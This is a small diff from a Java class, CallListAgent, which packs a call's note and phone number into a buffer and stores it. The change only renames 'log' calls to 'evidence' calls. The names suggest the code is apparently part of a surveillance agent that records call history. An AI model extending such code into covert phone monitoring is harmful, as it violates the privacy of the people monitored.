@@ -129,11 +129,11 @@ public final class CallListAgent extends Agent implements CallListObserver {
         Utils.addTypedString(databuffer, (byte) 0x04, note);
         Utils.addTypedString(databuffer, (byte) 0x08, number);
 
-        log.createLog(getAdditionalData());
+        evidence.createEvidence(getAdditionalData());
 
         final byte[] array = databuffer.getArray();
-        log.writeLog(array, 0);
-        log.close();
+        evidence.writeEvidence(array, 0);
+        evidence.close();
     }
 
     private int wsize(String string) {
